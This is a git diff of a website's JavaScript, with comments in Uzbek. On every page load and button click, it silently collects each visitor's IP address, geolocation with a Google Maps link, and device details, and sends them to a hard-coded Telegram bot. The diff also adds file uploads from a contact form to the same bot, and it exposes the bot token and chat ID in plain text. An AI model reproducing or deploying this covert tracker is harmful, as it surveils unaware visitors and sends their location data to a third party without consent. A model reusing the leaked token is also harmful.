@@ -8,26 +8,14 @@ let userCount = localStorage.getItem('userCount') ? parseInt(localStorage.getIte
 const token = '6518654563:AAHm3M2ekcpsHhB57fgb1tWvqWZN5VOPCgo'; // Telegram bot tokeni
 const chatId = '6852507131'; // Telegram chat ID
 
-
-
 // Qurilma haqida aniqroq ma'lumot olish funksiyasi
-function getDeviceInfo() {
-    const userAgent = navigator.userAgent;
-
-    if (/Android/i.test(userAgent)) {
-        const match = userAgent.match(/Android\s([0-9.]*);?\s?([A-Za-z0-9\s\-]*)?/);
-        const version = match && match[1] ? match[1] : 'Noma’lum versiya';
-        const model = match && match[2] ? match[2].trim() : 'Noma’lum model';
-        return `Android ${version}, Qurilma: ${model}`;
-    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
-        const match = userAgent.match(/iPhone\sOS\s([0-9_]+)/);
-        const version = match && match[1] ? match[1].replace('_', '.') : 'Noma’lum versiya';
-        return `Apple Qurilma: iPhone, iOS ${version}`;
-    } else if (/Windows/i.test(userAgent)) {
-        return `Windows tizimi: ${navigator.platform}`;
-    } else if (/Mac/i.test(userAgent)) {
-        return `macOS: ${navigator.platform}`;
-    } else {
+async function getDeviceInfo() {
+    try {
+        const response = await fetch('https://api.deviceinfo.me');
+        const data = await response.json();
+        return `${data.device}, ${data.os}`;
+    } catch (error) {
+        console.error('Qurilma ma\'lumotlarini olishda xatolik:', error);
         return 'Noma’lum qurilma';
     }
 }
@@ -35,16 +23,16 @@ function getDeviceInfo() {
 // Google Maps havolasi va yashash manzilini olish funksiyasi
 async function getLocationDetails(ip) {
     try {
-        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const response = await fetch(`https://ipapi.co/${ip}/json/`);
         const data = await response.json();
 
-        if (data.status === 'success') {
-            const { city, regionName, country, lat, lon } = data;
-            const location = `${city}, ${regionName}, ${country}`;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            return { location, mapLink };
-        } else {
+        if (data.error) {
             return { location: 'Manzil topilmadi', mapLink: '' };
+        } else {
+            const { city, region, country_name, latitude, longitude } = data;
+            const location = `${city}, ${region}, ${country_name}`;
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            return { location, mapLink };
         }
     } catch (error) {
         console.error('Manzilni olishda xatolik:', error);
@@ -55,23 +43,18 @@ async function getLocationDetails(ip) {
 // Telegramga xabar yuborish funksiyasi
 function sendTelegramMessage(ip, deviceInfo, location, mapLink, buttonId = null) {
     const buttonMessage = buttonId ? `Bosilgan tugma: ${buttonId}` : '';
-    const message = `IP: ${ip}\nRaqami: ${userCount}\nTelifoni: ${deviceInfo}\nYashash manzili: ${location}\n${mapLink}\n${buttonMessage}`;
+    const message = `🖥 *IP:* ${ip}\n👤 *Raqami:* ${userCount}\n📱 *Telefon:* ${deviceInfo}\n📍 *Manzil:* ${location}\n🔗 ${mapLink}\n${buttonMessage}`;
 
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
     })
         .then(response => {
             if (!response.ok) throw new Error('Telegram xabar yuborilmadi');
-            console.log(`Xabar yuborildi:\n${message}`);
+            console.log(`✅ Xabar yuborildi:\n${message}`);
         })
-        .catch(error => console.error('Telegram xabar yuborishda xatolik:', error));
+        .catch(error => console.error('❌ Telegram xabar yuborishda xatolik:', error));
 }
 
 // Foydalanuvchi IP manzilini aniqlash
@@ -90,7 +73,7 @@ async function getUserIP(buttonId = null) {
             localStorage.setItem('userCount', userCount);
 
             // Qurilma ma’lumotlarini olish
-            const deviceInfo = getDeviceInfo();
+            const deviceInfo = await getDeviceInfo();
 
             // Google Maps manzili va havolasini olish
             const { location, mapLink } = await getLocationDetails(userIP);
@@ -99,7 +82,7 @@ async function getUserIP(buttonId = null) {
             sendTelegramMessage(userIP, deviceInfo, location, mapLink, buttonId);
         } else if (buttonId) {
             // IP manzil to‘plamda bor, lekin tugma bosilgan
-            const deviceInfo = getDeviceInfo();
+            const deviceInfo = await getDeviceInfo();
             const { location, mapLink } = await getLocationDetails(userIP);
             sendTelegramMessage(userIP, deviceInfo, location, mapLink, buttonId);
         }
@@ -119,8 +102,20 @@ document.querySelectorAll('button').forEach(button => {
 // Sahifa yuklanganda foydalanuvchi IP manzilini olish
 window.onload = () => getUserIP();
 
-
 //telegramga habar yuborish
+document.getElementById('file-upload').addEventListener('change', function (event) {
+    const file = event.target.files[0];
+    const maxSize = 30 * 1024 * 1024; // 10 MB
+
+    if (file.size > maxSize) {
+      const errorMessage = document.getElementById('file-error-message');
+      errorMessage.style.display = 'block';
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 3000);
+      event.target.value = ''; // Clear the file input
+    }
+  });
 document.getElementById('telegram-form').addEventListener('submit', function (event) {
     event.preventDefault(); // Formani qayta yuklashning oldini oladi
 
@@ -128,52 +123,105 @@ document.getElementById('telegram-form').addEventListener('submit', function (ev
     var name = document.getElementById('name-contact-form-2-uo4jGuldhP').value;
     var telegramUsername = document.getElementById('telegram-username-contact-form-2-uo4jGuldhP').value;
     var message = document.getElementById('textarea-contact-form-2-uo4jGuldhP').value;
+    var file = document.getElementById('file-upload').files[0];
 
-    // Yuboriladigan xabar formatini yaratish (bold va italic format bilan)
-    var text = "Ismi: " + name + "\nTelegram Username: " + telegramUsername + "\nXabar: " + message;
+    // Yuboriladigan xabar formatini yaratish (bold format bilan)
+    var caption = `*👤Ismi:* ${name}\n*📱Telegram Username:* ${telegramUsername}\n*📩Xabar:* ${message}`;
 
     // Telegram bot tokeni va chat ID
     var token = "6518654563:AAHm3M2ekcpsHhB57fgb1tWvqWZN5VOPCgo";
     var chat_id = "6852507131";
-    var url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-    // Xabarni yuborish
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: chat_id,
-            text: text,
-        })
-    })
-        .then(response => {
-            if (response.ok) {
-                document.getElementById('success-message').removeAttribute('hidden');
-                // Form maydonlarini tozalash
-                document.getElementById('telegram-form').reset();
+    if (file) {
+        var formData = new FormData();
+        formData.append('chat_id', chat_id);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'Markdown');
 
-                // Xabarni 0.5 soniyadan keyin yashirish
-                setTimeout(function () {
-                    document.getElementById('success-message').setAttribute('hidden', 'hidden');
-                }, 2000);
-            } else {
-                throw new Error('Xatolik yuz berdi!');
-            }
+        if (file.type.startsWith('image/')) {
+            formData.append('photo', file);
+            sendFile(formData, `https://api.telegram.org/bot${token}/sendPhoto`);
+        } else if (file.type.startsWith('video/')) {
+            formData.append('video', file);
+            sendFile(formData, `https://api.telegram.org/bot${token}/sendVideo`);
+        } else {
+            formData.append('document', file);
+            sendFile(formData, `https://api.telegram.org/bot${token}/sendDocument`);
+        }
+    } else {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: caption,
+                parse_mode: 'Markdown'
+            })
         })
-        .catch(error => {
-            document.getElementById('error-message').removeAttribute('hidden');
-            console.error('Xatolik:', error);
-            // Xabarni 0.5 soniyadan keyin yashirish
-            setTimeout(function () {
-                document.getElementById('error-message').setAttribute('hidden', 'hidden');
-            }, 2000);
-        });
+            .then(response => handleResponse(response))
+            .catch(error => handleError(error));
+    }
 });
 
+function sendFile(formData, url) {
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
 
-///havola hatoligi
+    xhr.upload.onprogress = function (event) {
+        const progressBar = document.getElementById('progress-bar');
+        if (event.lengthComputable) {
+            const percentComplete = (event.loaded / event.total) * 100;
+            progressBar.style.width = percentComplete + '%';
+            progressBar.style.display = 'block';
+        }
+    };
+
+    xhr.onload = function () {
+        const progressBar = document.getElementById('progress-bar');
+        progressBar.style.display = 'none';
+        if (xhr.status === 200) {
+            handleResponse({ ok: true });
+        } else {
+            handleError(new Error('Fayl yuborishda xatolik yuz berdi!'));
+        }
+    };
+
+    xhr.onerror = function () {
+        const progressBar = document.getElementById('progress-bar');
+        progressBar.style.display = 'none';
+        handleError(new Error('Fayl yuborishda xatolik yuz berdi!'));
+    };
+
+    xhr.send(formData);
+}
+
+function handleResponse(response) {
+    if (response.ok) {
+        document.getElementById('success-message').removeAttribute('hidden');
+        // Form maydonlarini tozalash
+        document.getElementById('telegram-form').reset();
+
+        // Xabarni 0.5 soniyadan keyin yashirish
+        setTimeout(function () {
+            document.getElementById('success-message').setAttribute('hidden', 'hidden');
+        }, 2000);
+    } else {
+        throw new Error('Fayl yuborishda xatolik yuz berdi!');
+    }
+}
+
+function handleError(error) {
+    document.getElementById('error-message').removeAttribute('hidden');
+    console.error('Xatolik:', error);
+    // Xabarni 0.5 soniyadan keyin yashirish
+    setTimeout(function () {
+        document.getElementById('error-message').setAttribute('hidden', 'hidden');
+    }, 2000);
+}
+
+//havola hatoligi
 document.getElementById('myLink1').addEventListener('click', function (event) {
     event.preventDefault(); // Havolani ochishni to'xtatish
     document.getElementById('errorMessage1').style.display = 'block'; // Xabarni ko'rsatish
